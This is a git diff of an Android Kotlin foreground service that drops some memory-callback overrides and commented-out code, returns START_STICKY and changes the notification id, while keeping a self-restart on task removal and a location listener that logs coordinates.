@@ -58,37 +58,11 @@ class AppService : Service() {
             restartServicePendingIntent
     }
 
-    override fun onUnbind(intent: Intent?): Boolean {
-        Log.d(TAG, "unbind")
-        return super.onUnbind(intent)
-    }
-
-
-    override fun onTrimMemory(level: Int) {
-        Log.d(TAG, "onTrimMemory")
-        lifecycle = "trim-memory"
-        restartService()
-        super.onTrimMemory(level)
-    }
-
-    override fun onLowMemory() {
-        Log.d(TAG, "onTrimMemory")
-        lifecycle = "trim-memory"
-        restartService()
-        super.onLowMemory()
-    }
-
 
     @RequiresApi(Build.VERSION_CODES.M)
     override fun onTaskRemoved(rootIntent: Intent?) {
         Log.d(TAG, "onTaskRemoved")
 
-//        Handler().postDelayed({
-//            val broadcastIntent = Intent()
-//            broadcastIntent.action = "restartservice"
-//            broadcastIntent.setClass(this, RestartReceiver::class.java)
-//            this.sendBroadcast(broadcastIntent)
-//        }, 1000)
         restartService()
 
         super.onTaskRemoved(rootIntent)
@@ -125,31 +99,9 @@ class AppService : Service() {
         startForeground()
 
 
-        return super.onStartCommand(intent, flags, startId)
+        return START_STICKY
     }
 
-//    private fun startLocationService() {
-//        locationManager = getSystemService(LOCATION_SERVICE) as LocationManager?
-//        if (ActivityCompat.checkSelfPermission(
-//                applicationContext,
-//                Manifest.permission.ACCESS_FINE_LOCATION
-//            ) != PackageManager.PERMISSION_GRANTED &&
-//            ActivityCompat.checkSelfPermission(
-//                applicationContext,
-//                Manifest.permission.ACCESS_COARSE_LOCATION
-//            ) != PackageManager.PERMISSION_GRANTED
-//        ) {
-//            return
-//        }
-//        locationManager?.requestLocationUpdates(
-//            LocationManager.NETWORK_PROVIDER,
-//            10000L,
-//            0F,
-//            locationListener
-//        )
-//    }
-
-    //define the listener
     private val locationListener: LocationListener = object : LocationListener {
         override fun onLocationChanged(location: Location) {
             Log.d(TAG, "location " + location.longitude + ":" + location.latitude)
@@ -218,7 +170,7 @@ class AppService : Service() {
             .setPriority(PRIORITY_MIN)
             .setCategory(Notification.CATEGORY_SERVICE)
             .build()
-        startForeground(101, notification)
+        startForeground(1, notification)
     }
 
     @RequiresApi(Build.VERSION_CODES.O)
